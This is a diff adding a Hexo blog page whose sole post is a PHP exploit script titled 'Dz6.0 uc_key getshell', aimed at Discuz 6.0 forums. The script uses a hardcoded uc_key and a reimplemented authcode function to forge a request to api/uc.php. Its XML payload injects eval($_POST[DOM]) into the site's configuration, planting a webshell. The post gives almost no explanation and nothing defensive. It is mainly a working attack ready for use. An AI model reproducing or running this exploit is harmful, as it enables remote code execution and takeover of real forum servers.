@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1.  注意事项：dz6.0 uc_key getshell 是因为 xml标签解析函数和加密函数改动变动，改动相应的EXP即可getsehll 2.  &amp;lt;span class=&amp;quot;pun&amp;quot;&amp;gt;$post = uc_unserialize(uc_post_contents()); &amp;lt;/span&amp;gt;3.  &amp;lt;span class=&amp;quot;pun&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dz6.0 uc_key getshell">
+<meta property="og:url" content="http://yoursite.com/2015/11/19/dz6-0-uc-key-getshell/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1.  注意事项：dz6.0 uc_key getshell 是因为 xml标签解析函数和加密函数改动变动，改动相应的EXP即可getsehll 2.  &amp;lt;span class=&amp;quot;pun&amp;quot;&amp;gt;$post = uc_unserialize(uc_post_contents()); &amp;lt;/span&amp;gt;3.  &amp;lt;span class=&amp;quot;pun&amp;quo">
+<meta property="og:updated_time" content="2018-02-26T06:01:52.634Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dz6.0 uc_key getshell">
+<meta name="twitter:description" content="1.  注意事项：dz6.0 uc_key getshell 是因为 xml标签解析函数和加密函数改动变动，改动相应的EXP即可getsehll 2.  &amp;lt;span class=&amp;quot;pun&amp;quot;&amp;gt;$post = uc_unserialize(uc_post_contents()); &amp;lt;/span&amp;gt;3.  &amp;lt;span class=&amp;quot;pun&amp;quo">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2015/11/19/dz6-0-uc-key-getshell/"/>
+
+
+
+
+
+  <title>Dz6.0 uc_key getshell | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2015/11/19/dz6-0-uc-key-getshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Dz6.0 uc_key getshell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-11-19T09:51:14+08:00">
+                2015-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <font color="#93a1a1">注意事项：dz6.0 uc_key getshell 是因为 xml标签解析函数和加密函数改动变动，改动相应的EXP即可getsehll </font><br>2.  <code>&lt;span class=&quot;pun&quot;&gt;$post = uc_unserialize(uc_post_contents());
+&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;$configfile = preg_replace(&quot;/define\(&#39;UC_API&#39;,\s&amp;#42&#39;.&amp;#42?&#39;\);/i&quot;, &quot;define(&#39;UC_API&#39;, &#39;$UC_API&#39;);&quot;, $configfile);
+&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pun&quot;&gt;
+&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;php&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;com&quot;&gt;// 代码版权归原作者所有！&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;    $timestamp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; time&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()+&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3600&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;    $host&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;    $uc_key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Qfp1O0N3h5V356bbUdPer3958dp8X3b55dBa9fKai7s3Q7AbY9I3Hcnc7ec505sa&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;pln&quot;&gt;    $code&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlencode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;_authcode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;time=$timestamp&amp;amp;action=updateapps&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;ENCODE&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $uc_key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;));&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;pln&quot;&gt;    $cmd1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;</code><br>13.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;UC_API&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;UC_API&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;http://xxx\&#39;);eval($_POST[DOM]);//&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/UC_API&amp;gt;&lt;/span&gt;</code><br>14.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&#39;;&lt;/span&gt;</code><br>15.  <code>&lt;span class=&quot;pln&quot;&gt;    $cmd2=&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;xml version&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; encoding&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;ISO-8859-1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt;</code><br>16.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;</code><br>17.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;item&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;UC_API&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;http://aaa&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/item&amp;gt;&lt;/span&gt;</code><br>18.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&#39;;&lt;/span&gt;</code><br>19.  <code>&lt;span class=&quot;pln&quot;&gt;    $html1 = send($cmd1);&lt;/span&gt;</code><br>20.  <code>&lt;span class=&quot;pln&quot;&gt;    echo $html1;&lt;/span&gt;</code><br>21.  <code>&lt;span class=&quot;pln&quot;&gt;    #$html2 = send($cmd2);&lt;/span&gt;</code><br>22.  <code>&lt;span class=&quot;pln&quot;&gt;    #echo $html2;&lt;/span&gt;</code><br>23.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>24.  <code>&lt;span class=&quot;pln&quot;&gt;function send($cmd){&lt;/span&gt;</code><br>25.  <code>&lt;span class=&quot;pln&quot;&gt;    global $host,$code;&lt;/span&gt;</code><br>26.  <code>&lt;span class=&quot;pln&quot;&gt;    $message = &quot;POST /dz/api/uc.php?code=&quot;.$code.&quot;  HTTP/1.1\r\n&quot;;&lt;/span&gt;</code><br>27.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Accept: &amp;#42/&amp;#42\r\n&quot;;&lt;/span&gt;</code><br>28.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Referer: &quot;.$host.&quot;\r\n&quot;;&lt;/span&gt;</code><br>29.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Accept-Language: zh-cn\r\n&quot;;&lt;/span&gt;</code><br>30.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;&lt;/span&gt;</code><br>31.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n&quot;;&lt;/span&gt;</code><br>32.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;&lt;/span&gt;</code><br>33.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;;&lt;/span&gt;</code><br>34.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Connection: Close\r\n\r\n&quot;;&lt;/span&gt;</code><br>35.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= $cmd;&lt;/span&gt;</code><br>36.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>37.  <code>&lt;span class=&quot;pln&quot;&gt;    //var_dump($message);&lt;/span&gt;</code><br>38.  <code>&lt;span class=&quot;pln&quot;&gt;    $fp = fsockopen($host, 80);&lt;/span&gt;</code><br>39.  <code>&lt;span class=&quot;pln&quot;&gt;    fputs($fp, $message);&lt;/span&gt;</code><br>40.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>41.  <code>&lt;span class=&quot;pln&quot;&gt;    $resp = &#39;&#39;;&lt;/span&gt;</code><br>42.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>43.  <code>&lt;span class=&quot;pln&quot;&gt;    while ($fp &amp;amp;&amp;amp; !feof($fp))&lt;/span&gt;</code><br>44.  <code>&lt;span class=&quot;pln&quot;&gt;        $resp .= fread($fp, 1024);&lt;/span&gt;</code><br>45.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>46.  <code>&lt;span class=&quot;pln&quot;&gt;    return $resp;&lt;/span&gt;</code><br>47.  <code>&lt;span class=&quot;pln&quot;&gt;}&lt;/span&gt;</code><br>48.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>49.  <code>&lt;span class=&quot;pln&quot;&gt;function _authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) {&lt;/span&gt;</code><br>50.51.  <code>&lt;span class=&quot;pln&quot;&gt;    $ckey_length = 4;    // 随机密钥长度 取值 0-32;&lt;/span&gt;</code><br>52.  <code>&lt;span class=&quot;pln&quot;&gt;                // 加入随机密钥，可以令密文无任何规律，即便是原文和密钥完全相同，加密结果也会每次不同，增大破解难度。&lt;/span&gt;</code><br>53.  <code>&lt;span class=&quot;pln&quot;&gt;                // 取值越大，密文变动规律越大，密文变化 = 16 的 $ckey_length 次方&lt;/span&gt;</code><br>54.  <code>&lt;span class=&quot;pln&quot;&gt;                // 当此值为 0 时，则不产生随机密钥&lt;/span&gt;</code><br>55.56.  <code>&lt;span class=&quot;pln&quot;&gt;    $key = md5($key ? $key : UC_KEY);&lt;/span&gt;</code><br>57.  <code>&lt;span class=&quot;pln&quot;&gt;    $keya = md5(substr($key, 0, 16));&lt;/span&gt;</code><br>58.  <code>&lt;span class=&quot;pln&quot;&gt;    $keyb = md5(substr($key, 16, 16));&lt;/span&gt;</code><br>59.  <code>&lt;span class=&quot;pln&quot;&gt;    $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;&lt;/span&gt;</code><br>60.61.  <code>&lt;span class=&quot;pln&quot;&gt;    $cryptkey = $keya.md5($keya.$keyc);&lt;/span&gt;</code><br>62.  <code>&lt;span class=&quot;pln&quot;&gt;    $key_length = strlen($cryptkey);&lt;/span&gt;</code><br>63.64.  <code>&lt;span class=&quot;pln&quot;&gt;    $string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;&lt;/span&gt;</code><br>65.  <code>&lt;span class=&quot;pln&quot;&gt;    $string_length = strlen($string);&lt;/span&gt;</code><br>66.67.  <code>&lt;span class=&quot;pln&quot;&gt;    $result = &#39;&#39;;&lt;/span&gt;</code><br>68.  <code>&lt;span class=&quot;pln&quot;&gt;    $box = range(0, 255);&lt;/span&gt;</code><br>69.70.  <code>&lt;span class=&quot;pln&quot;&gt;    $rndkey = array();&lt;/span&gt;</code><br>71.  <code>&lt;span class=&quot;pln&quot;&gt;    for($i = 0; $i &amp;lt;= 255; $i++) {&lt;/span&gt;</code><br>72.  <code>&lt;span class=&quot;pln&quot;&gt;        $rndkey[$i] = ord($cryptkey[$i % $key_length]);&lt;/span&gt;</code><br>73.  <code>&lt;span class=&quot;pln&quot;&gt;    }&lt;/span&gt;</code><br>74.75.  <code>&lt;span class=&quot;pln&quot;&gt;    for($j = $i = 0; $i &amp;lt; 256; $i++) {&lt;/span&gt;</code><br>76.  <code>&lt;span class=&quot;pln&quot;&gt;        $j = ($j + $box[$i] + $rndkey[$i]) % 256;&lt;/span&gt;</code><br>77.  <code>&lt;span class=&quot;pln&quot;&gt;        $tmp = $box[$i];&lt;/span&gt;</code><br>78.  <code>&lt;span class=&quot;pln&quot;&gt;        $box[$i] = $box[$j];&lt;/span&gt;</code><br>79.  <code>&lt;span class=&quot;pln&quot;&gt;        $box[$j] = $tmp;&lt;/span&gt;</code><br>80.  <code>&lt;span class=&quot;pln&quot;&gt;    }&lt;/span&gt;</code><br>81.82.  <code>&lt;span class=&quot;pln&quot;&gt;    for($a = $j = $i = 0; $i &amp;lt; $string_length; $i++) {&lt;/span&gt;</code><br>83.  <code>&lt;span class=&quot;pln&quot;&gt;        $a = ($a + 1) % 256;&lt;/span&gt;</code><br>84.  <code>&lt;span class=&quot;pln&quot;&gt;        $j = ($j + $box[$a]) % 256;&lt;/span&gt;</code><br>85.  <code>&lt;span class=&quot;pln&quot;&gt;        $tmp = $box[$a];&lt;/span&gt;</code><br>86.  <code>&lt;span class=&quot;pln&quot;&gt;        $box[$a] = $box[$j];&lt;/span&gt;</code><br>87.  <code>&lt;span class=&quot;pln&quot;&gt;        $box[$j] = $tmp;&lt;/span&gt;</code><br>88.  <code>&lt;span class=&quot;pln&quot;&gt;        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));&lt;/span&gt;</code><br>89.  <code>&lt;span class=&quot;pln&quot;&gt;    }&lt;/span&gt;</code><br>90.91.  <code>&lt;span class=&quot;pln&quot;&gt;    if($operation == &#39;DECODE&#39;) {&lt;/span&gt;</code><br>92.  <code>&lt;span class=&quot;pln&quot;&gt;        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &amp;gt; 0) &amp;amp;&amp;amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {&lt;/span&gt;</code><br>93.  <code>&lt;span class=&quot;pln&quot;&gt;            return substr($result, 26);&lt;/span&gt;</code><br>94.  <code>&lt;span class=&quot;pln&quot;&gt;        } else {&lt;/span&gt;</code><br>95.  <code>&lt;span class=&quot;pln&quot;&gt;            return &#39;&#39;;&lt;/span&gt;</code><br>96.  <code>&lt;span class=&quot;pln&quot;&gt;        }&lt;/span&gt;</code><br>97.  <code>&lt;span class=&quot;pln&quot;&gt;    } else {&lt;/span&gt;</code><br>98.  <code>&lt;span class=&quot;pln&quot;&gt;        return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result));&lt;/span&gt;</code><br>99.  <code>&lt;span class=&quot;pln&quot;&gt;    }&lt;/span&gt;</code><br>100.101.  <code>&lt;span class=&quot;pln&quot;&gt;}&lt;/span&gt;</code><br>102.  <code>&lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt;</code></pre></div><div><br></div>
+
+<div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/11/03/e6-80-8e-e6-a0-b7-e7-94-a8-e6-a0-91-e8-8e-93-e6-b4-be-e5-92-8ckali-linux-e6-9e-84-e5-bb-ba-e4-be-bf-e6-90-ba-e5-bc-8f-e9-bb-91-e5-ae-a2-e5-b7-a5-e4-bd-9c-e7-ab-99/" rel="next" title="怎样用树莓派和Kali Linux构建便携式黑客工作站">
+                <i class="fa fa-chevron-left"></i> 怎样用树莓派和Kali Linux构建便携式黑客工作站
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/11/25/stripcslashes-e5-8f-8d-e5-ba-8f-e5-88-97-e5-92-8c-e6-9d-a1-e4-bb-b6-e7-ab-9e-e4-ba-89-e6-9a-b4-e5-8a-9b-e6-b3-a8-e5-85-a5writeup/" rel="prev" title="stripcslashes反序列和条件竞争“暴力”注入writeup">
+                stripcslashes反序列和条件竞争“暴力”注入writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
